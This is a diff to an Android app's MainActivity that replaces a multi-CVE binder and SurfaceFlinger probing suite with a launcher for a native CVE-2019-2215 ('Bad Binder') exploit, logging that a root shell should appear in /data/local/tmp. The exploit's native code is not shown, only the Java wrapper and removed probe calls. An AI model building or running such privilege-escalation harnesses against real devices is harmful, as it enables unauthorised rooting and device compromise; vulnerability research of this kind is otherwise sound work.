@@ -53,17 +53,7 @@ public class MainActivity extends AppCompatActivity {
         System.loadLibrary("pocjni");
     }
 
-    // ----- Native methods -----
-    public static native int nativeOpenDevice(String path);
-    public static native byte[] nativeBinderTransaction(int fd, int handle, int code, int flags, byte[] data);
-    public static native String nativeBinderDumpReply(int fd, int handle, int code, int flags, byte[] data);
-    public static native int nativeBinderThreadExit(int fd);
-    public static native int nativeEpollTest(int fd);
-    public static native int nativeBinderIoctlTest(int fd, int cmd, long arg);
-    public static native int nativeHwServiceManagerAddTest(int fd, String serviceName);
-    public static native int nativeSurfaceFlingerLayerTest(int fd);
-    public static native int nativeKernelInfoLeakTest(int fd);
-    public static native int nativeBinderOutOfBoundsTest(int fd);
+    public static native int nativeExploitCVE20192215();
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -71,7 +61,7 @@ public class MainActivity extends AppCompatActivity {
             tzService = IMinkSocketFd.Stub.asInterface(service);
             if (tzService != null) {
                 appendLog("[TZ] Service bound");
-                updateStatus("Bound - starting");
+                updateStatus("Bound - starting exploit");
                 enableButtons(false, true);
                 stopRequested.set(false);
                 testThread = new Thread(() -> executeExploit());
@@ -122,7 +112,7 @@ public class MainActivity extends AppCompatActivity {
                 isTesting.set(false);
             }
         });
-        appendLog("App started. Press 'Start'.");
+        appendLog("App started. Press 'Start' to begin.");
     }
 
     private void requestPermissions() {
@@ -173,217 +163,33 @@ public class MainActivity extends AppCompatActivity {
 
     private void executeExploit() {
         appendLog("========================================");
-        appendLog("========== CVE VERIFICATION SUITE ==========");
+        appendLog("========== CVE-2019-2215 EXPLOIT ==========");
 
-        int binderFd = nativeOpenDevice("/dev/binder");
-        int hwbinderFd = nativeOpenDevice("/dev/hwbinder");
+        appendLog("[*] Triggering Bad Binder exploit...");
+        appendLog("[!] WARNING: This may crash the device if offsets are incorrect");
 
-        if (binderFd < 0 && hwbinderFd < 0) {
-            appendLog("[!] No binder device available");
-            return;
-        }
+        int result = nativeExploitCVE20192215();
 
-        appendLog("[*] === CVE-2019-2215: Binder Use-After-Free (epoll + BINDER_THREAD_EXIT) ===");
-        if (binderFd >= 0) {
-            testCVE20192215(binderFd);
+        if (result == 0) {
+            appendLog("[+] Exploit SUCCESS! Root shell should be available.");
+            appendLog("[+] Check /data/local/tmp/ for root shell");
+        } else if (result == -1) {
+            appendLog("[-] Exploit FAILED: Permission denied");
+        } else if (result == -2) {
+            appendLog("[-] Exploit FAILED: Device not vulnerable or offsets incorrect");
+        } else if (result == -3) {
+            appendLog("[-] Exploit FAILED: Kernel panic detected");
         } else {
-            appendLog("[!] /dev/binder not available, skipping");
+            appendLog("[-] Exploit returned unknown code: " + result);
         }
 
-        appendLog("[*] === CVE-2020-0041: Binder Out-of-Bounds Write ===");
-        if (binderFd >= 0) {
-            testCVE20200041(binderFd);
-        } else {
-            appendLog("[!] /dev/binder not available, skipping");
-        }
-
-        appendLog("[*] === CVE-2020-0423: Binder Use-After-Free (race condition) ===");
-        if (binderFd >= 0) {
-            testCVE20200423(binderFd);
-        } else {
-            appendLog("[!] /dev/binder not available, skipping");
-        }
-
-        appendLog("[*] === CVE-2019-2023: hwservicemanager PID-based ACL bypass ===");
-        if (hwbinderFd >= 0) {
-            testCVE20192023(hwbinderFd);
-        } else {
-            appendLog("[!] /dev/hwbinder not available, skipping");
-        }
-
-        appendLog("[*] === CVE-2020-0273: hwservicemanager wild pointer free ===");
-        if (hwbinderFd >= 0) {
-            testCVE20200273(hwbinderFd);
-        } else {
-            appendLog("[!] /dev/hwbinder not available, skipping");
-        }
-
-        appendLog("[*] === CVE-2020-0392 / CVE-2019-2194: SurfaceFlinger ===");
-        if (binderFd >= 0) {
-            testSurfaceFlingerCVEs(binderFd);
-        } else {
-            appendLog("[!] /dev/binder not available, skipping");
-        }
-
-        appendLog("[*] === Kernel Info Leak Test (Generic) ===");
-        if (binderFd >= 0) {
-            testKernelInfoLeak(binderFd);
-        } else {
-            appendLog("[!] /dev/binder not available, skipping");
-        }
-
-        if (binderFd >= 0) {
-            try { ParcelFileDescriptor.adoptFd(binderFd).close(); } catch (Exception e) {}
-        }
-        if (hwbinderFd >= 0) {
-            try { ParcelFileDescriptor.adoptFd(hwbinderFd).close(); } catch (Exception e) {}
-        }
-
-        appendLog("========== CVE VERIFICATION COMPLETED ==========");
+        appendLog("========== EXPLOIT COMPLETED ==========");
         appendLog("========================================");
         updateStatus("Done");
         isTesting.set(false);
         enableButtons(true, false);
         saveLog();
         finishTest();
-    }
-
-    // ----- CVE-2019-2215: Binder Use-After-Free -----
-    // 参考: https://github.com/cloudfuzz/android-kernel-exploitation[reference:9]
-    // PoC: epoll_ctl(EPOLL_CTL_ADD) + BINDER_THREAD_EXIT[reference:10]
-    private void testCVE20192215(int fd) {
-        appendLog("[CVE-2019-2215] Testing Binder UAF via epoll + BINDER_THREAD_EXIT");
-
-        int ret = nativeEpollTest(fd);
-        if (ret == 0) {
-            appendLog("[CVE-2019-2215] epoll test SUCCESS - vulnerability MAY be present");
-        } else if (ret == -1) {
-            appendLog("[CVE-2019-2215] epoll test FAILED - likely patched or unsupported");
-        } else if (ret == -2) {
-            appendLog("[CVE-2019-2215] epoll test produced kernel crash/panic - VULNERABLE!");
-        } else {
-            appendLog("[CVE-2019-2215] epoll test returned unknown: " + ret);
-        }
-
-        appendLog("[CVE-2019-2215] Testing BINDER_THREAD_EXIT ioctl alone");
-        int ret2 = nativeBinderThreadExit(fd);
-        if (ret2 == 0) {
-            appendLog("[CVE-2019-2215] BINDER_THREAD_EXIT succeeded (expected)");
-        } else {
-            appendLog("[CVE-2019-2215] BINDER_THREAD_EXIT returned: " + ret2);
-        }
-    }
-
-    // ----- CVE-2020-0041: Binder Out-of-Bounds Write -----
-    // 参考: https://www.anquanke.com/post/id/202810[reference:11]
-    private void testCVE20200041(int fd) {
-        appendLog("[CVE-2020-0041] Testing Binder OOB write via malformed transaction");
-
-        int ret = nativeBinderOutOfBoundsTest(fd);
-        if (ret == 0) {
-            appendLog("[CVE-2020-0041] OOB test completed - no crash detected");
-        } else if (ret == -1) {
-            appendLog("[CVE-2020-0041] OOB test failed - likely patched");
-        } else if (ret == -2) {
-            appendLog("[CVE-2020-0041] OOB test produced crash - VULNERABLE!");
-        } else {
-            appendLog("[CVE-2020-0041] OOB test returned: " + ret);
-        }
-    }
-
-    // ----- CVE-2020-0423: Binder Use-After-Free (race condition) -----
-    // 参考: binder_release_work() のロック競合[reference:12]
-    private void testCVE20200423(int fd) {
-        appendLog("[CVE-2020-0423] Testing Binder UAF via thread exit race");
-
-        int ret = nativeBinderThreadExit(fd);
-        if (ret == 0) {
-            appendLog("[CVE-2020-0423] Multiple BINDER_THREAD_EXIT test completed");
-        } else {
-            appendLog("[CVE-2020-0423] BINDER_THREAD_EXIT returned: " + ret);
-        }
-    }
-
-    // ----- CVE-2019-2023: hwservicemanager PID-based ACL bypass -----
-    // In ServiceManager::add, insecure permissions check based on PID[reference:13][reference:14]
-    private void testCVE20192023(int fd) {
-        appendLog("[CVE-2019-2023] Testing hwservicemanager ACL bypass");
-
-        String[] testServices = {"test.cve.service", "com.example.test", "vendor.test.service"};
-        for (String svc : testServices) {
-            int ret = nativeHwServiceManagerAddTest(fd, svc);
-            if (ret == 0) {
-                appendLog("[CVE-2019-2023] Service '" + svc + "' ADD returned SUCCESS - VULNERABLE!");
-            } else if (ret == -1) {
-                appendLog("[CVE-2019-2023] Service '" + svc + "' ADD failed (permission denied) - patched");
-            } else if (ret == -2) {
-                appendLog("[CVE-2019-2023] Service '" + svc + "' ADD failed (service already exists)");
-            } else {
-                appendLog("[CVE-2019-2023] Service '" + svc + "' ADD returned: " + ret);
-            }
-        }
-    }
-
-    // ----- CVE-2020-0273: hwservicemanager wild pointer free -----
-    // In hwservicemanager, possible out of bounds write due to freeing a wild pointer[reference:15]
-    private void testCVE20200273(int fd) {
-        appendLog("[CVE-2020-0273] Testing hwservicemanager wild pointer free");
-
-        int[] testCmds = {0x40046201, 0x40046202, 0x60046201, 0x60046202};
-        for (int cmd : testCmds) {
-            int ret = nativeBinderIoctlTest(fd, cmd, 0);
-            if (ret == 0) {
-                appendLog("[CVE-2020-0273] ioctl(0x" + Integer.toHexString(cmd) + ") succeeded (unexpected)");
-            } else {
-                appendLog("[CVE-2020-0273] ioctl(0x" + Integer.toHexString(cmd) + ") failed: " + ret);
-            }
-        }
-    }
-
-    // ----- SurfaceFlinger CVEs (CVE-2020-0392, CVE-2019-2194) -----
-    // CVE-2020-0392: getLayerDebugInfo double free[reference:16]
-    // CVE-2019-2194: createLayer improper casting[reference:17]
-    private void testSurfaceFlingerCVEs(int fd) {
-        appendLog("[SurfaceFlinger] Testing CVE-2020-0392 (double free) and CVE-2019-2194 (improper casting)");
-
-        int ret = nativeSurfaceFlingerLayerTest(fd);
-        if (ret == 0) {
-            appendLog("[SurfaceFlinger] Layer test completed - no crash detected");
-        } else if (ret == -1) {
-            appendLog("[SurfaceFlinger] Layer test failed - likely patched or permission denied");
-        } else if (ret == -2) {
-            appendLog("[SurfaceFlinger] Layer test produced crash - VULNERABLE!");
-        } else {
-            appendLog("[SurfaceFlinger] Layer test returned: " + ret);
-        }
-    }
-
-    // ----- Kernel Info Leak Test -----
-    private void testKernelInfoLeak(int fd) {
-        appendLog("[KERNEL-LEAK] Testing for kernel pointer leaks via binder");
-
-        int ret = nativeKernelInfoLeakTest(fd);
-        if (ret == 0) {
-            appendLog("[KERNEL-LEAK] Leak test completed - no leak detected");
-        } else if (ret > 0) {
-            appendLog("[KERNEL-LEAK] Potential leak detected! (" + ret + " bytes)");
-        } else if (ret == -1) {
-            appendLog("[KERNEL-LEAK] Leak test failed - likely patched");
-        } else {
-            appendLog("[KERNEL-LEAK] Leak test returned: " + ret);
-        }
-    }
-
-    private void dumpToFile(byte[] data, String filename) {
-        File dir = getDumpDir();
-        if (dir == null || data == null) return;
-        File file = new File(dir, filename);
-        try (FileOutputStream fos = new FileOutputStream(file)) {
-            fos.write(data);
-            appendLog("[DUMP] Saved " + data.length + " bytes to " + file.getAbsolutePath());
-        } catch (Exception e) {
-            appendLog("[DUMP] Failed: " + e.getMessage());
-        }
     }
 
     private File getDumpDir() {
@@ -412,9 +218,9 @@ public class MainActivity extends AppCompatActivity {
     private void saveLog() {
         try {
             File dir = getDumpDir();
-            File file = new File(dir, "cve_verification_log.txt");
+            File file = new File(dir, "cve_2019_2215_log.txt");
             try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
-                pw.println("=== CVE Verification Log ===");
+                pw.println("=== CVE-2019-2215 Exploit Log ===");
                 pw.println("Timestamp: " + new Date().toString());
                 pw.println("===================================");
                 pw.print(logBuilder.toString());
@@ -428,7 +234,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void finishTest() {
         handler.post(() -> {
-            Toast.makeText(MainActivity.this, "CVE Verification completed", Toast.LENGTH_LONG).show();
+            Toast.makeText(MainActivity.this, "Exploit completed", Toast.LENGTH_LONG).show();
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 finishAffinity();
                 System.exit(0);
